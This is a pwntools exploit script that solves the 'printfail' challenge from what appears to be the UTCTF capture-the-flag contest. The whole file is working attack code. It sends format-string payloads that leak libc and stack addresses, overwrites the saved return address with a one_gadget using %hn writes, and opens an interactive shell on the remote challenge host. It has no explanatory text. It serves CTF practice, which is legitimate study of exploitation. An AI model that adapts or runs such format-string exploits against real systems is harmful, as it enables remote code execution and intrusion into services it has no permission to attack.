from pwn import *

exe = context.binary = ELF('./printfail_patched', checksec=False)
libc = ELF('./libc-2.31.so', checksec=False)
# r = exe.process()
# gdb.attach(r, api=True, gdbscript='''
#            b*run_round+132
#            b*main+123
#            ''')

r = remote('puffer.utctf.live', 4630)

libc.sym['one_gadget'] = 0xe3b01

fmt = b'%13$p%8$p%7$hn'
r.sendlineafter(b'do-overs.\n', fmt)
libc_leak = r.recv(14)
stack = r.recv(14)
stack = int(stack, 16)
libc.address = int(libc_leak, 16) - libc.sym['__libc_start_main'] - 243
print(hex(libc.address))
print(hex(stack))

save_rip = stack + 8

fmt = f'%{save_rip & 0xffff}c%30$hn%2c%31$hn%7$hn'
r.sendlineafter(b'chance.\n', fmt)

print(hex(libc.sym['one_gadget']))

fmt = f"%{(libc.sym['one_gadget'] >> 16) & 0xff}c%45$hhn"
fmt += f"%{(libc.sym['one_gadget'] & 0xffff) - ((libc.sym['one_gadget'] >> 16) & 0xff)}c%43$hn"
r.sendlineafter(b'chance.\n', fmt)

r.interactive()